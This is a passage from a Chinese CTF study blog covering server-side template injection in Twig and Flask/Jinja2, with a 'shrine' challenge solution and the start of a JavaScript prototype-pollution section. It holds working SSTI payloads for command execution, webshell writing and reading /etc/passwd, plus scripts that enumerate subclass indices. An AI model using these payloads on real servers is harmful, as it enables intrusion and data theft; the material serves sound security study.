href="#Twig-自动转义" class="headerlink" title="Twig 自动转义"></a>Twig 自动转义</h3><p>Twig 自动转义某些字符，例如&lt;或&gt;。可以使用<code>autoescape</code>选项关闭自动转义</p><pre><code class="php">$twig = new Environment($loader, [    &#39;autoescape&#39; =&gt; false]);</code></pre><pre><code class="php">$data = &quot;&lt;script src=&#39;http::/example.com/nastyscript.js&#39;&gt;&lt;/script&gt;&quot;;echo $twig-&gt;render(&#39;autoescape.html.twig&#39;, [&#39;data&#39; =&gt; $data]);</code></pre><pre><code class="php">&lt;p&gt;The data is &#123;&#123; data &#125;&#125;&lt;/p&gt;&lt;p&gt;The data is &#123;&#123; data | raw &#125;&#125;&lt;/p&gt;</code></pre><p>如果启用了自动转义，我们可以使用<code>raw</code>过滤器显示原始输入。</p><pre><code class="php">&lt;p&gt;The data is &lt;script src=&#39;http://example.com/nastyscript.js&#39;&gt;&lt;/script&gt;&lt;/p&gt;&lt;p&gt;The data is &lt;script src=&#39;http://example.com/nastyscript.js&#39;&gt;&lt;/script&gt;&lt;/p&gt;</code></pre><p>其后的内容暂不研究，先回到主题–SSTI</p><h2 id="Twig-SSTI"><a href="#Twig-SSTI" class="headerlink" title="Twig SSTI"></a>Twig SSTI</h2><p>这里研究一下这篇博客：<a href="https://xz.aliyun.com/t/7518#toc-5">TWIG 全版本通用 SSTI payloads - 先知社区 (aliyun.com)</a></p><h3 id="map"><a href="#map" class="headerlink" title="map"></a>map</h3><p><code>map</code> 对应的函数是<code>twig_array_map</code> ,下面是其实现</p><pre><code>function twig_array_map($array, $arrow)&#123;    $r = [];    foreach ($array as $k =&gt; $v) &#123;        $r[$k] = $arrow($v, $k);    &#125;    return $r;&#125;</code></pre><p>从上面的代码我们可以看到，$arrow 是可控的，将数组的键值对分别作为箭头函数的两个参数，然后将执行结果赋值给$r，漏洞就来自这里。</p><p>arrow function最后会变成一个<code>closure</code></p><p>举个例子</p><pre><code>&#123;&#123;["man"]|map((arg)=>"hello #&#123;arg&#125;")&#125;&#125;</code></pre><p>会被编译成（在 Twig 模板引擎中，<code>#&#123;&#125;</code> 用于将变量的值嵌入到字符串中。）</p><pre><code>twig_array_map([0 =&gt; &quot;id&quot;], function ($__arg__) use ($context, $macros) &#123; $context[&quot;arg&quot;] = $__arg__;return (&quot;hello &quot; . ($context[&quot;arg&quot;] ?? null))</code></pre><p>在这里，<code>__arg__</code> 是 <code>twig_array_map</code> 中数组的每个元素，而不是一个回调函数的参数。在匿名函数的闭包内，<code>__arg__</code> 代表了数组中的当前元素。</p><p>可以不传arrow function，可以只传一个字符串。</p><p>所以我们需要找个两个参数的能够命令执行的危险函数即可。通过查阅常见的命令执行函数：</p><ul><li><blockquote><p>system ( string <code>$command</code> [, int <code>&amp;$return_var</code> ] ) : string</p></blockquote></li><li><blockquote><p>passthru ( string <code>$command</code> [, int <code>&amp;$return_var</code> ] )</p></blockquote></li><li><blockquote><p>exec ( string <code>$command</code> [, array <code>&amp;$output</code> [, int <code>&amp;$return_var</code> ]] ) : string</p></blockquote></li><li><blockquote><p>popen ( string <code>$command</code> , string <code>$mode</code> )</p></blockquote></li><li><blockquote><p>shell_exec ( string <code>$cmd</code> ) : string</p></blockquote></li></ul><p>如果以上都被ban了，那么使用<code>&#123;&#123;&#123;"<?php phpinfo();":"/var/www/html/shell.php"&#125;|map("file_put_contents")&#125;&#125;</code> 可以写个shell，实际上它相当于执行:</p><pre><code>file_put_contents（&quot;/var/www/html/shell.php&quot;，&quot;&lt;?php phpinfo();&quot;）</code></pre><p>要注意参数顺序</p><p>其他的暂不研究，上一下目前的payload：</p><pre><code>&#123;&#123;'/etc/passwd'|file_excerpt(1,30)&#125;&#125;&#123;&#123;app.request.files.get(1).__construct('/etc/passwd','')&#125;&#125;&#123;&#123;app.request.files.get(1).openFile.fread(99)&#125;&#125;&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("whoami")&#125;&#125;&#123;&#123;_self.env.enableDebug()&#125;&#125;&#123;&#123;_self.env.isDebug()&#125;&#125;&#123;&#123;["id"]|map("system")|join(",")&#123;&#123;&#123;"<?php phpinfo();":"/var/www/html/shell.php"&#125;|map("file_put_contents")&#125;&#125;&#123;&#123;["id",0]|sort("system")|join(",")&#125;&#125;&#123;&#123;["id"]|filter("system")|join(",")&#125;&#125;&#123;&#123;[0,0]|reduce("system","id")|join(",")&#125;&#125;&#123;&#123;['cat /etc/passwd']|filter('system')&#125;&#125;</code></pre><p>php 中的模板还有一些，暂时先放一放，原理应该大同小异，接下来先看看python下的模板注入：</p><h1 id="python-ssti"><a href="#python-ssti" class="headerlink" title="python ssti"></a>python ssti</h1><p>这里还是顺带以flask为入口简单了解一下python web：</p><p><a href="https://blog.csdn.net/weixin_45950544/article/details/104067405">Flask之最易懂的基础教程一（2020年最新-从入门到精通）-CSDN博客</a></p><p>简单使用：</p><pre><code># 导入Flask类库from flask import Flask# 创建应用实例app = Flask(__name__)# 视图函数（路由）@app.route(&#39;/&#39;)def index():    return &#39;&lt;h1&gt;Hello Flask!&lt;h1&gt;&#39;# 启动实施（只在当前模块运行）if __name__ == &#39;__main__&#39;:    app.run()</code></pre><p>这里可以设置app.run(debug&#x3D;True)方便调试</p><p>带参数的视图函数：</p><pre><code># 导入Flask类库from flask import Flask# 创建应用实例app = Flask(__name__)# 视图函数（路由）@app.route(&#39;/user/&lt;username&gt;&#39;)def setname(username):    username=&#39;2333&#39;    return usernamedef say_hello(username):    return &#39;&lt;h1&gt;Hello %s !&lt;h1&gt;&#39; % username# 启动实施（只在当前模块运行）if __name__ == &#39;__main__&#39;:    app.run(debug=True)</code></pre><p>这里一个路由下可以有多个视图函数，但是返回值值能时最后一个视图函数的返回值，因为依次执行视图函数后后面的覆盖前面的</p><p>关于参数：</p><blockquote><p>参数要写在&lt;&gt;中、</p><p>视图函数的参数要与路由中的一致</p><p>也可以指定参数类型（int&#x2F;float&#x2F;path），默认是字符串</p><ul><li><p>**<code>int</code>**：匹配一个整数类型的 URL 变量。</p></li><li><p>**<code>float</code>**：匹配一个浮点数类型的 URL 变量。</p></li><li><p>**<code>path</code>**：匹配一个字符串类型的 URL 变量，但不限制其内容，可以包含斜杠 <code>/</code>。</p><p>@app.route(‘&#x2F;user&#x2F;<a href="path:info">path:info</a>‘)</p></li></ul></blockquote><h5 id="获取request请求值"><a href="#获取request请求值" class="headerlink" title="获取request请求值"></a>获取request请求值</h5><pre><code># 导入Flask类库from flask import Flask,request# 创建应用实例app = Flask(__name__)# request@app.route(&#39;/request/&lt;path:info&gt;&#39;)def request_url(info):    # 完整的请求URL    return request.url    &#39;&#39;&#39;    url：127.0.0.1:5000/request/abc/def?username=xiaoming&amp;pwd=123    网页返回值：http://127.0.0.1:5000/request/abc/def?username=xiaoming&amp;pwd=123    &#39;&#39;&#39;    # 去掉GET参数的URL    return request.base_url    &#39;&#39;&#39;    网页返回值：http://127.0.0.1:5000/request/abc/def    &#39;&#39;&#39;    # 只有主机和端口的URL    return request.host_url    &#39;&#39;&#39;    网页返回值：http://127.0.0.1:5000/    &#39;&#39;&#39;    # 装饰器中写的路由地址    return request.path    &#39;&#39;&#39;    网页返回值：/request/abc/def    &#39;&#39;&#39;    # 请求方法类型    return request.method    &#39;&#39;&#39;    网页返回值：GET （也有可能是POST）    &#39;&#39;&#39;    # 远程地址    return request.remote_addr    &#39;&#39;&#39;    网页返回值：127.0.0.1:5000    &#39;&#39;&#39;    # 获取url参数    return request.args.get(&#39;username&#39;)    return request.args.get(&#39;pwd&#39;)    return str(request.args)    # 获取headers信息    return request.headers.get(&#39;User-Agent&#39;)# 启动实施（只在当前模块运行）if __name__ == &#39;__main__&#39;:    app.run()</code></pre><h5 id="响应的构造（make-response）"><a href="#响应的构造（make-response）" class="headerlink" title="响应的构造（make_response）"></a>响应的构造（make_response）</h5><pre><code>from flask import Flask,make_responseapp = Flask(__name__)@app.route(&#39;/response/&#39;)def response():    # 不指定状态码，默认为200，表示OK    # return ‘OK’    # 构造一个404状态码    # 方法一    return &#39;not fount&#39;,404    # 方法二    # 导入make_response    # 自定义构造一个响应，然后返回200，构造也可以指定状态码404    res = make_response(&#39;我是通过函数构造的响应&#39;,404)    return resif __name__ == &#39;__main__&#39;:    app.run()</code></pre><p>其他一些开发细节暂不深入，先看一下jinja2</p><p>先看一看介绍：</p><p>Flask模板</p><ol><li>模板介绍：<br> 结构清晰、易于维护的代码开发原则是程序员追求的目标之一。目前我们所写的代码都比较简单，但是很明显的可以预见的一个问题是，当项目越来越复杂时，视图函数将变得异常庞大和繁琐，因为视图函数中存放了业务逻辑和表现逻辑。<br> 解决这类问题的通用方法是将不同种类的逻辑分开存放：<br> 业务逻辑：存放在视图函数中，专门处理用户的业务需求；<br> 表现逻辑：存放在单独的模板文件夹中，负责表现效果。</li><li>模板引擎<br> 指定了一套特定的语法来实现表达逻辑，提供了一种专门的替换接口将模板文件换成目标文件（html）。——flask中提供了专门的模板引擎（jinja2）</li></ol><p>看起来模板主要是接管了表现效果的单独文件夹，先看一个简单的例子：</p><pre><code>from flask import Flask,render_template,render_template_string,gfrom flask_script import Managerapp = Flask(__name__)manager = Manager(app)@app.route(&#39;/index&#39;)def index():    # return &#39;模板引擎测试&#39;    # 渲染模板文件    return render_template(&#39;index.html&#39;)@app.route(&#39;/index/&lt;name&gt;&#39;)def welcome(name):    # 变量参数写在渲染函数的后面作为参数，前面的name是形参，后面的name是渲染模板中的解析内容    # return render_template(&#39;index.html&#39;,name=name)    # 第二种方法，使用render_template_string（渲染字符串）    # return render_template_string(&#39;&lt;h2&gt;hello &#123;&#123; name &#125;&#125; ! &lt;h2&gt;&#39;,name=name)    # 第三种方法，使用  g（全局函数）,不需要分配就可以在模板中使用,    # 只需要给定渲染模板即可；    g.name = name    return render_template(&#39;index.html&#39;)if __name__ == &#39;__main__&#39;:    manager.run()</code></pre><blockquote><p>在 Flask 中，默认情况下，<code>render_template(&#39;index.html&#39;)</code> 会在指定的模板文件夹内查找名为 <code>index.html</code> 的模板文件。</p><p>Flask 默认的模板文件夹是项目根目录下的 <code>templates</code> 文件夹。所以，如果你的 <code>index.html</code> 文件位于 <code>templates</code> 文件夹下，那么 <code>render_template(&#39;index.html&#39;)</code> 将会在这个文件夹中查找并渲染 <code>index.html</code> 文件。</p><p>如果你的 <code>index.html</code> 文件不在默认的 <code>templates</code> 文件夹中，而是在其他文件夹，你可以通过指定文件夹路径的方式告诉 Flask 在哪里找到模板文件。你需要在创建 Flask 应用时通过指定 <code>template_folder</code> 参数来设置模板文件夹的路径，如下所示：</p><pre><code>pythonCopy codeapp = Flask(__name__, template_folder=&#39;your_template_folder_path&#39;)</code></pre><p>确保将 <code>&#39;your_template_folder_path&#39;</code> 替换为实际存储模板文件的文件夹路径。这样 Flask 就会在指定的文件夹中查找并渲染模板文件。</p></blockquote><p>然后这里也可以使用函数-类似twig中的filter：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311141654641.png" alt="image-20231114165408388"></p><h3 id="类的知识总结"><a href="#类的知识总结" class="headerlink" title="类的知识总结"></a>类的知识总结</h3><pre><code>__class__            类的一个内置属性，表示实例对象的类。__base__             类型对象的直接基类__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases____mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。__subclasses__()     返回这个类的子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.__init__             初始化类，返回的类型是function__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a[&#39;b&#39;]，就是a.__getitem__(&#39;b&#39;)__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()]__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#39;__builtins__&#39;]含有current_app。get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#39;__builtins__&#39;]含有current_app。lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123;&#123;lipsum.__globals__['os'].popen('ls').read()&#125;&#125;current_app          应用上下文，一个全局变量。request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;/proc\self\fd/3&#39;).read()request.args.x1    get传参request.values.x1  所有参数request.cookies      cookies参数request.headers      请求头参数request.form.x1    post传参(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)request.data   post传参(Content-Type:a/b)request.json post传json  (Content-Type: application/json)config               当前application的所有配置。此外，也可以这样&#123;&#123; config.__class__.__init__.__globals__['os'].popen('ls').read() &#125;&#125;g                    &#123;&#123;g&#125;&#125;得到&lt;flask.g of &#39;flask_ssti&#39;&gt;</code></pre><h3 id="常见过滤器"><a href="#常见过滤器" class="headerlink" title="常见过滤器"></a>常见过滤器</h3><p><a href="https://ttl255.com/jinja2-tutorial-part-4-template-filters/#references">Jinja2 Tutorial - Part 4 - Template filters | (ttl255.com)</a></p><pre><code>常用的过滤器int()：将值转换为int类型；float()：将值转换为float类型；lower()：将字符串转换为小写；upper()：将字符串转换为大写；title()：把值中的每个单词的首字母都转成大写；capitalize()：把变量值的首字母转成大写，其余字母转小写；trim()：截取字符串前面和后面的空白字符；wordcount()：计算一个长字符串中单词的个数；reverse()：字符串反转；replace(value,old,new)： 替换将old替换为new的字符串；truncate(value,length=255,killwords=False)：截取length长度的字符串；striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；escape()或e：转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。safe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： &#123;&#123;'<em>hello</em>'|safe&#125;&#125;；list()：将变量列成列表；string()：将变量转换成字符串；join()：将一个序列中的参数值拼接成字符串。示例看上面payload；abs()：返回一个数值的绝对值；first()：返回一个序列的第一个元素；last()：返回一个序列的最后一个元素；format(value,arags,*kwargs)：格式化字符串。比如：&#123;&#123; "%s" - "%s"|format('Hello?',"Foo!") &#125;&#125;将输出：Helloo? - Foo!length()：返回一个序列或者字典的长度；sum()：返回列表内数值的和；sort()：返回排序后的列表；default(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default(&#39;xiaotuo&#39;)----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。length()返回字符串的长度，别名是count</code></pre><p>其他的开发类容暂不探究</p><h2 id="jinja-SSTI"><a href="#jinja-SSTI" class="headerlink" title="jinja SSTI"></a>jinja SSTI</h2><p><a href="https://zhuanlan.zhihu.com/p/93746437">CTF|有关SSTI的一切小秘密【Flask SSTI+姿势集+Tplmap大杀器】 - 知乎 (zhihu.com)</a></p><p>Flask SSTI 题的基本思路就是利用 python 中的 魔术方法 找到自己要用的函数。</p><ul><li>__dict__：保存类实例或对象实例的属性变量键值对字典</li><li>__class__：返回调用的参数类型</li><li>__mro__：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</li><li>__bases__：返回类型列表</li><li>__subclasses__：返回object的子类</li><li>__init__：类的初始化方法</li><li>__globals__：函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价</li></ul><blockquote><p><strong>base</strong> 和 <strong>mro</strong> 都是用来寻找基类的。</p></blockquote><p>我们可以使用</p><pre><code>for i, subclass in enumerate(str.__class__.__mro__[-1].__subclasses__()):    print(i, subclass)</code></pre><p>来方便查阅我们需要的某个子类的索引：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311141944262.png" alt="image-20231114194457561"></p><p>SSTI 的主要目的就是从这么多的子类中找出可以利用的类（一般是指读写文件或执行命令的类）加以利用。</p><p><a href="https://xz.aliyun.com/t/9584#toc-0">以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区 (aliyun.com)</a></p><p><code>__builtins__</code>：以一个集合的形式查看其引用</p><blockquote><h4 id="内建函数"><a href="#内建函数" class="headerlink" title="内建函数"></a>内建函数</h4><p>当我们启动一个python解释器时，即时没有创建任何变量或者函数，还是会有很多函数可以使用，我们称之为内建函数。</p><p>内建函数并不需要我们自己做定义，而是在启动python解释器的时候，就已经导入到内存中供我们使用，想要了解这里面的工作原理，我们可以从名称空间开始。</p><p><code>__builtins__</code> 方法是做为默认初始模块出现的，可用于查看当前所有导入的内建函数。</p></blockquote><p><code>__globals__</code>：该方法会以字典的形式返回当前位置的所有全局变量，与 func_globals 等价。该属性是函数特有的属性，记录当前文件全局变量的值，如果某个文件调用了os、sys等库，但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用globals属性访问全局的变量。该属性保存的是函数全局变量的字典引用。</p><pre><code>__import__()`：该方法用于动态加载类和函数 。如果一个模块经常变化就可以使用 `__import__()` 来动态载入，就是 `import`。语法：`__import__(模块名)</code></pre><p>这样我们在进行SSTI注入的时候就可以通过这种方式使用很多的类和方法，通过子类再去获取子类的子类、更多的方法，找出可以利用的类和方法加以利用。总之，是通过python的对象的继承来一步步实现文件读取和命令执行的：</p><pre><code>找到父类&lt;type &#39;object&#39;&gt; ---&gt; 寻找子类 ---&gt; 找关于命令执行或者文件操作的模块。</code></pre><h3 id="一些使用到的类或方法："><a href="#一些使用到的类或方法：" class="headerlink" title="一些使用到的类或方法："></a>一些使用到的类或方法：</h3><h4 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h4><p>python2——file类：</p><pre><code>&#123;&#123;[].__class__.__base__.__subclasses__()[40]('/etc/passwd').read()&#125;&#125;</code></pre><p>Python3——使用file类读取文件的方法仅限于Python 2环境，在Python 3环境中file类已经没有了。我们可以用<code>&lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;</code> 这个类去读取文件。首先编写脚本遍历目标Python环境中 <code>&lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;</code> 这个类索引号：</p><pre><code>import requestsheaders = &#123;    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36&#39;&#125;for i in range(500):    url = &quot;http://47.xxx.xxx.72:8000/?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()["+str(i)+"]&#125;&#125;&quot;    res = requests.get(url=url, headers=headers)    if &#39;FileLoader&#39; in res.text:        print(i)</code></pre><pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[79]["get_data"](0, "/etc/passwd")&#125;&#125;</code></pre><h4 id="内建函数-eval-执行命令"><a href="#内建函数-eval-执行命令" class="headerlink" title="内建函数 eval 执行命令"></a>内建函数 eval 执行命令</h4><ul><li>warnings.catch_warnings</li><li>WarningMessage</li><li>codecs.IncrementalEncoder</li><li>codecs.IncrementalDecoder</li><li>codecs.StreamReaderWriter</li><li>os._wrap_close</li><li>reprlib.Repr</li><li>weakref.finalize</li></ul><p>首先编写脚本遍历目标Python环境中含有内建函数 eval 的子类的索引号</p><pre><code>import requestsheaders = &#123;    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36&#39;&#125;for i in range(500):    url = &quot;http://47.xxx.xxx.72:8000/?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()["+str(i)+"].__init__.__globals__['__builtins__']&#125;&#125;&quot;    res = requests.get(url=url, headers=headers)    if &#39;eval&#39; in res.text:        print(i)</code></pre><pre><code>&#123;&#123;''.__class__.__bases__[0].__subclasses__()[166].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')&#125;&#125;</code></pre><p>使用eval函数执行命令也是调用的os模块</p><p>Python的 os 模块中有system和popen这两个函数可用来执行命令。其中system()函数执行命令是没有回显的，我们可以使用system()函数配合curl外带数据；popen()函数执行命令有回显。所以比较常用的函数为popen()函数，而当popen()函数被过滤掉时，可以使用system()函数代替。</p><pre><code>import requestsheaders = &#123;    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36&#39;&#125;for i in range(500):    url = &quot;http://47.xxx.xxx.72:8000/?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()["+str(i)+"].__init__.__globals__&#125;&#125;&quot;    res = requests.get(url=url, headers=headers)    if &#39;os.py&#39; in res.text:        print(i)</code></pre><p>随便挑一个类构造payload执行命令即可：</p><pre><code>&#123;&#123;''.__class__.__bases__[0].__subclasses__()[79].__init__.__globals__['os'].popen('ls /').read()&#125;&#125;</code></pre><p>但是该方法遍历得到的类不准确，因为一些不相关的类名中也存在字符串 “os”，所以我们还要探索更有效的方法。</p><p>我们可以看到，即使是使用os模块执行命令，其也是调用的os模块中的popen函数，那我们也可以直接调用popen函数，存在popen函数的类一般是 <code>os._wrap_close</code>，但也不绝对。由于目标Python环境的不同，我们还需要遍历一下。</p><pre><code>import requestsheaders = &#123;    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36&#39;&#125;for i in range(500):    url = &quot;http://47.xxx.xxx.72:8000/?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()["+str(i)+"].__init__.__globals__&#125;&#125;&quot;    res = requests.get(url=url, headers=headers)    if &#39;popen&#39; in res.text:        print(i)</code></pre><pre><code>&#123;&#123;''.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__['popen']('ls /').read()&#125;&#125;</code></pre><p>还有一些内容，这里就不搬过来了，可以自行查看<a href="https://xz.aliyun.com/t/9584#toc-0">以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区 (aliyun.com)</a></p><p>这里还是找几个靶场检验一下</p><h1 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h1><h2 id="shrine"><a href="#shrine" class="headerlink" title="shrine"></a>shrine</h2><p>题目源码：</p><pre><code>import flaskimport osapp = flask.Flask(__name__)app.config[&#39;FLAG&#39;] = os.environ.pop(&#39;FLAG&#39;)@app.route(&#39;/&#39;)def index():    return open(__file__).read()@app.route(&#39;/shrine/&lt;path:shrine&gt;&#39;)def shrine(shrine):    def safe_jinja(s):        s = s.replace(&#39;(&#39;, &#39;&#39;).replace(&#39;)&#39;, &#39;&#39;)        blacklist = [&#39;config&#39;, &#39;self&#39;]        return &#39;&#39;.join([&#39;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#39;.format(c) for c in blacklist]) + s    return flask.render_template_string(safe_jinja(shrine))if __name__ == &#39;__main__&#39;:    app.run(debug=True)</code></pre><p>现在看这个题就比较清晰了，waf了config和self，但flag放在了config中，如果没有黑名单的时候，我们可以传入 config，或者传入获取，这里还要再去查一下这个config：</p><p><a href="https://zhuanlan.zhihu.com/p/24055329">Flask项目配置（Configuration） - 知乎 (zhihu.com)</a></p><p><a href="https://www.cnblogs.com/andy9468/p/10870574.html">flask的配置项及获取 - 安迪9468 - 博客园 (cnblogs.com)</a></p><p>从第二篇博客中我们发现可以使用current_app：</p><pre><code>&#123;&#123;url_for.__globals__['current_app'].config.FLAG&#125;&#125;&#123;&#123;get_flashed_messages.__globals__['current_app'].config.FLAG&#125;&#125;&#123;&#123;request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']&#125;&#125;</code></pre><h2 id="easytornado"><a href="#easytornado" class="headerlink" title="easytornado"></a>easytornado</h2><p>在提示中我们知道需要获取一个cookie-secret的值，我们还需要补充一些知识：</p><p><a href="https://www.cnblogs.com/cimuhuashuimu/p/11544455.html">python SSTI tornado render模板注入 - Hanamizuki花水木 - 博客园 (cnblogs.com)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/bmjoker/p/13508538.html&quot;&gt;1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园 (cnblogs.com)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://taninluv.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>原型链污染</title>
    <link href="https://taninluv.github.io/2023/11/07/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    <id>https://taninluv.github.io/2023/11/07/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</id>
    <published>2023-11-07T08:27:38.000Z</published>
    <updated>2023-11-07T09:02:07.947Z</updated>
    
    <content type="html"><![CDATA[<h1 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h1><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain#%E6%A3%80%E6%9F%A5%E5%8E%9F%E5%9E%8B%EF%BC%9A%E6%9B%B4%E6%B7%B1%E5%85%A5%E7%9A%84%E7%A0%94%E7%A9%B6">继承与原型链 - JavaScript | MDN (mozilla.org)</a></p><p><a href="https://drun1baby.top/2022/12/29/JavaScript-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">JavaScript 原型链污染 | Drunkbaby’s Blog (drun1baby.top)</a></p><p>简单来说就是：</p><ul><li><code>prototype</code> 是 <code>newClass</code> 类的一个属性</li><li><code>newClass</code> 类实例化的对象 <code>newObj</code> 不能访问 <code>prototype</code>，但可以通过<code>.__proto__</code> 来访问 <code>newClass</code> 类的 <code>prototype</code></li><li><code>newClass</code> 实例化的对象 <code>newObj</code> 的 <code>.__proto__</code> 指向 <code>newClass</code> 类的 <code>prototype</code></li></ul><h3 id="哪些情况下原型链会被污染"><a href="#哪些情况下原型链会被污染" class="headerlink" title="哪些情况下原型链会被污染"></a>哪些情况下原型链会被污染</h3><p>找能够控制数组（对象）的“键名”的操作即可：</p><ul><li>对象 merge</li><li>对象 clone（其实内核就是将待操作的对象 merge 到一个空对象中）</li></ul><h1 id="test"><a href="#test" class="headerlink" title="test:"></a>test:</h1><pre><code>function merge(target, source) &#123;    for (let key in source) &#123;        if (key in source &amp;&amp; key in target) &#123;            merge(target[key], source[key])        &#125; else &#123;            target[key] = source[key]        &#125;    &#125;&#125;</code></pre><pre><code>let o1 = &#123;&#125;let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;merge(o1, o2)console.log(o1.a, o1.b)o3 = &#123;&#125;console.log(o3.b)</code></pre><p>这里<code>__proto__</code>已经代表o2的原型，并没有被当作key，故无法污染链子</p><pre><code>let o1 = &#123;&#125;let o2 = JSON.parse(&#39;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#39;)merge(o1, o2)console.log(o1.a, o1.b)o3 = &#123;&#125;console.log(o3.b)</code></pre><p>JSON 解析的情况下，<code>__proto__</code> 会被认为是一个真正的“键名”，而不代表“原型”,此时可以造成污染。</p><h1 id="CatCTF-2022-wife"><a href="#CatCTF-2022-wife" class="headerlink" title="CatCTF 2022 wife"></a>CatCTF 2022 wife</h1><pre><code>app.post(&#39;/register&#39;, (req, res) =&gt; &#123;    let user = JSON.parse(req.body)    if (!user.username || !user.password) &#123;        return res.json(&#123; msg: &#39;empty username or password&#39;, err: true &#125;)    &#125;    if (users.filter(u =&gt; u.username == user.username).length) &#123;        return res.json(&#123; msg: &#39;username already exists&#39;, err: true &#125;)    &#125;    if (user.isAdmin &amp;&amp; user.inviteCode != INVITE_CODE) &#123;        user.isAdmin = false        return res.json(&#123; msg: &#39;invalid invite code&#39;, err: true &#125;)    &#125;    let newUser = Object.assign(&#123;&#125;, baseUser, user) //就是这里，原型链污染    users.push(newUser)    res.json(&#123; msg: &#39;user created successfully&#39;, err: false &#125;)&#125;)</code></pre><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/assign">Object.assign() - JavaScript | MDN (mozilla.org)</a></p><p><strong><code>Object.assign()</code></strong> 静态方法将一个或者多个<em>源对象</em>中所有<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/propertyIsEnumerable">可枚举</a>的<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/hasOwn">自有属性</a>复制到<em>目标对象</em>，并返回修改后的目标对象。</p><p>正常情况下是无法污染的：</p><pre><code>baseUser = &#123;    a:1&#125;user = &#123;    a:2,    b:1,    __proto__:&#123;        c:3    &#125;&#125; // 这个函数的作用：浅复制一个对象，第一个参数位是对象的内容，后面的参数位是多个对象内容叠加进去，进行复制出一个全新的对象let newUser = Object.assign(&#123;&#125;, baseUser, user)  // 无污染，结果正常console.log(newUser)  // &#123;a: 